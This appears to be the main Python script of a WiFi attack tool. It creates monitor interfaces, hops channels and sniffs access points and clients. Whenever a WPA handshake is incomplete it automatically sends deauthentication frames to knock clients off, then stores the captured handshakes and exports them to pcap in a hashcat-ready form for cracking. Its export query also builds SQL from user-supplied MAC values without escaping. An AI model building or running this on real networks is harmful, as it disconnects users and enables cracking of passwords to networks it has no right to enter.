# -*- coding: utf-8 -*-

import os
from loguru import logger
from termcolor import colored
import argparse
from time import sleep
import subprocess
from pyiw import interface
from pyiw.exceptions import *
from pyiw.types import *
from sniffer.Sniffer import Sniffer
from sniffer.Database import Database
from sniffer.CellSniffer import CellSniffer
from sniffer.types import CellClientPair, HandshakeCapture, FourSidedHandshake
from sniffer.HandshakeSniffer import HandshakeSniffer
from sniffer.send import DeAuth
from threading import Thread
from random import randint as rand
import sqlite3
from util import mac, pcap
import tempfile
import sys
import re

from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11
from scapy.layers.eap import EAPOL
from scapy.packet import Raw


class ChannelJumper(Thread):

    def __init__(self, app):
        Thread.__init__(self)
        self.app = app
        self.is_working = False

    def stop(self):
        self.is_working = False

    def run(self):
        self.is_working = True
        while self.is_working:
            sleep(300)
            self.app.channel = rand(1, 13)
            print(f"{colored('*', 'green')} Set monitor interface {colored(self.app.ifc, 'cyan')} on channel {colored(self.app.channel, 'magenta')} ... {colored('OK', 'green')}")
            interface.set_channel(self.app.ifc, self.app.channel)

class App:

    def __init__(self, args, db):
        self.db = Database(db)
        self.jumper = ChannelJumper(self)
        self.ifc = args.iface
        self.channel = int(args.chan)
        self.hopping = args.jump
        self.is_working = False

        self.sniffer = Sniffer(self.ifc)

        self.cell_sniffer = CellSniffer(self.sniffer)
        self.sniffer.add_packet_handler(self.cell_sniffer)

        self.handshake_sniffer = HandshakeSniffer(self.sniffer)
        self.sniffer.add_packet_handler(self.handshake_sniffer)


    def start(self):
        self.is_working = True

        try:
            interface.set_channel(self.ifc, self.channel)
        except DeviceBusyError:
            print(f"{colored('*', 'red')} Monitor interface {colored(self.ifc, 'cyan')} is busy!")
            flags = interface.get_flags(self.ifc)

            if InterfaceFlags.DOWN in flags:
                print(f"{colored(' *', 'yellow')} Seems interface {colored(self.ifc, 'red')} is disabled.")
                print(f"{colored(' *', 'yellow')} Use {colored('-u/--up', 'yellow')} {colored(self.ifc, 'cyan')} to enable.")
            return

        print(f"{colored('*', 'green')} Set monitor interface {colored(self.ifc, 'cyan')} on channel {colored(self.channel, 'magenta')} ... {colored('OK', 'green')}")

        self.sniffer.start()
        print(f"{colored('*', 'green')} Sniffer thread started {colored(self.ifc, 'cyan')} ... {colored('OK', 'green')}")
        
        if self.hopping:
            self.jumper.start()
            print(f"{colored('*', 'green')} Channel hopper started, with interval {colored('300s', 'cyan')} ... {colored('OK', 'green')}")

        try:
            while self.is_working:
                self.loop()
                sleep(1)
        except KeyboardInterrupt:
            print(f"{colored('*', 'green')} Stopping sniffer...")
            self.is_working = False
            self.sniffer.stop()

            if self.hopping:
                self.jumper.stop()
                self.jumper.join()

    def loop(self):
        access_points = self.cell_sniffer.access_points
        handshake_captures = self.handshake_sniffer.handshake_captures

        for ap in self.cell_sniffer.access_points:
            bssid = ap.get("bssid")
            clients = ap.get("clients", [])

            for client in clients:
                if mac.is_multicast(client):
                    continue

                pair = CellClientPair(bssid, client)
                capture = HandshakeCapture(pair)

                captures = self.handshake_sniffer.handshake_captures

                if not captures.count(capture):
                    self.handshake_sniffer.add_capture(capture)

        for capture in handshake_captures:
            with self.db.connect() as connection:
                cursor = connection.cursor()
                query = "SELECT * FROM Handshake WHERE ap_mac = ? AND cl_mac = ? LIMIT 1;"
                result = cursor.execute(query, (capture.pair.cell, capture.pair.client))
                exists = result.fetchone()

                if capture.complete and not check_pcap(capture):
                    print(f"{colored('-', 'red')} {colored(capture, 'red')}")
                    capture.handshake = FourSidedHandshake()

                if not exists and capture.complete:
                    print(f"{colored('>', 'green')} {colored(str(capture), 'yellow')}")

                    self.add_handshake(capture, cursor)
                elif not capture.complete and not exists:
                    sys.stdout.flush()
                    print(f"{colored('!', 'yellow')} {capture}", end="\r")
                    deauth = DeAuth(capture.pair)
                    deauth.send(self.ifc, rand(4, 10))
                # else:
                #     print(f"{colored('?', 'red')} {colored(str(capture), 'yellow')}")

    def add_handshake(self, capture, cursor):
        query = "INSERT OR IGNORE INTO Handshake (ap_mac, cl_mac, beacon, one, two, three, four) VALUES (?, ?, ?, ?, ?, ?, ?);"
        cell = capture.pair.cell
        client = capture.pair.client
        beacon = bytes(capture.beacon)
        one = bytes(capture.handshake.one)
        two = bytes(capture.handshake.two)
        three = bytes(capture.handshake.three)
        four = bytes(capture.handshake.four)

        cursor.execute(query, (cell, client, beacon, one, two, three, four))

    def update_handshake(self, capture, cursor):
        pass

def check_pcap(capture):
    (fd_pcap, fn_pcap) = tempfile.mkstemp(prefix="snf_pcap_")
    (fd_hccapx, fn_hccapx) = tempfile.mkstemp(prefix="snf_hccapx_")

    hs = capture.handshake
    pcap.save(fn_pcap, [capture.beacon, hs.one, hs.two, hs.three, hs.four])

    try:
        output = subprocess.check_output(['cap2hccapx', fn_pcap, fn_hccapx])
    except Exception as e:
        print(e)
        return

    os.close(fd_pcap)
    os.close(fd_hccapx)

    if os.path.exists(fn_pcap):
        os.remove(fn_pcap)

    if os.path.exists(fn_hccapx):
        os.remove(fn_hccapx)

    regex = r"Written (?P<count>\d+) WPA Handshakes"
    match = re.search(regex, output.decode(), re.I)

    return bool(int((match and match.groupdict().get("count", 0)) or 0))

def main(args):
    if args.list:
        interfaces = interface.all_wireless()

        if not interfaces:
            print(f"{colored('*', 'red')} No wireless interfaces!")
        else:
            print(f"Wireless interfaces:")

        for ifc in interfaces:
            flags = interface.get_flags(ifc)
            is_up = InterfaceFlags.UP in flags
            is_mon = interface.is_monitor(ifc)

            s = ["-", "+"][is_up]
            c = ["red", "green"][is_up]
            m = ["white", "cyan"][is_mon]

            print(f"    [{colored(s, c)}] {colored(ifc, m)}")

        return
    elif args.up:
        ifc = args.up
        if ifc not in interface.all_wireless():
            print(f"{colored('*', 'red')} No such interface {colored(ifc, 'yellow')}!")
            return

        flags = interface.get_flags(ifc)
        if InterfaceFlags.UP not in flags:
            try:
                interface.set_state(ifc, InterfaceState.UP)
                print(f"{colored('*', 'green')} Interface {colored(ifc, 'green')} enabled.")
            except BlockedByRfKillError:
                print(f"{colored('*', 'yellow')} Unblock interface {colored(ifc, 'yellow')} by rfkill!")
        else:
            print(f"{colored('*', 'yellow')} Interface {colored(ifc, 'yellow')} already enabled!")

    elif args.down:
        ifc = args.down

        if ifc not in interface.all_wireless():
            print(f"{colored('*', 'red')} No such interface {colored(ifc, 'yellow')}!")
            return

        flags = interface.get_flags(ifc)
        if InterfaceFlags.DOWN not in flags:
            interface.set_state(ifc, InterfaceState.DOWN)
            print(f"{colored('*', 'green')} Interface {colored(ifc, 'red')} disabled.")
        else:
            print(f"{colored('*', 'yellow')} Interface {colored(ifc, 'yellow')} already disabled!")
    
    elif args.mon and args.iface:
        ifc = args.iface
        mon = args.mon

        if ifc not in interface.all_wireless():
            print(f"{colored('*', 'red')} No such interface {colored(ifc, 'yellow')}!")
            return
        
        if mon not in interface.all_monitor():
            print(f"{colored('*', 'yellow')} Creating ({colored(ifc, 'yellow')} -> {colored(mon, 'cyan')}) monitor interface.")
            try:
                interface.add_monitor(ifc, mon)
            except PermissionError:
                print(f"{colored('*', 'red')} Root required to create new interface.")
                return

            print(f"{colored('*', 'green')} Done {colored(mon, 'cyan')}.")
        else:
            print(f"{colored('*', 'yellow')} Monitor interface {colored(mon, 'yellow')} already created!")

    elif args.sniff:
        ifc = args.iface
        chan = args.chan
        
        if not ifc:
            print(f"{colored('*', 'red')} Set wireless interface {colored('-i/--iface', 'yellow')}!")
            return
        
        if not chan:
            print(f"{colored('*', 'red')} Set interface channel {colored('-c/--chan', 'yellow')}!")
            return

        if ifc not in interface.all_monitor():
            print(f"{colored('*', 'red')} No such monitor interface {colored(ifc, 'yellow')}!")
            print(f"{colored('*', 'yellow')} Create one with {colored('-i/--iface', 'yellow')} {colored('wlan0', 'cyan')} {colored('-m/--mon', 'yellow')} {colored('mon0', 'cyan')}.")
            return

        app = App(args, "app.db")
        app.start()
    elif args.export_pcap:
        db = Database("app.db")
        with db.connect() as connection:
            cursor = connection.cursor()
            if args.mac:
                l = ','.join(map(lambda x: f"'{x}'", args.mac))
                query = f"SELECT ap_mac, beacon, one, two, three, four FROM Handshake WHERE ap_mac in ({l}) GROUP BY ap_mac;"
            else:
                query = "SELECT ap_mac, beacon, one, two, three, four FROM Handshake GROUP BY ap_mac;"
            result = cursor.execute(query)

            packets = []
            for record in result.fetchall():
                del record["ap_mac"]
                packets.extend(list(map(lambda p: RadioTap(_pkt=p), record.values())))
            
            print(f"{colored('*', 'yellow')} Saved to {colored(args.export_pcap, 'yellow')}.")
            pcap.save(args.export_pcap, packets)


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument('--list', '-l', action='store_true', help=f"List interfaces.")
    p.add_argument('--sniff', '-s', action='store_true', help=f"Enable sniffing.")

    p.add_argument('--jump', '-j', action='store_true', help=f"Enable channel jumping.")
    p.add_argument('--interval', '-t', default=None, help=f"Set channel jump interval.")

    p.add_argument('--export-pcap', '-e', default=None, help=f"Used to export from database.")
    p.add_argument('--mac', nargs='+', default=None, help=f"Used to export {colored('access points', 'red')} from database by {colored('MAC', 'red')}.")
    p.add_argument('--chan', '-c', default=None, help=f"Set start (if jump) {colored('channel', 'red')} to listen.")
    p.add_argument('--mon', '-m', default=None, help=f"Create new {colored('monitor', 'red')} interface.")
    p.add_argument('--iface', '-i', default=None, help=f"Used to create {colored('monitor', 'red')} interfaces.")
    p.add_argument('--up', '-u', default=None, help=f"Enable {colored('interface', 'red')}.")
    p.add_argument('--down', '-d', default=None, help=f"Disable {colored('interface', 'red')}.")

    main(p.parse_args())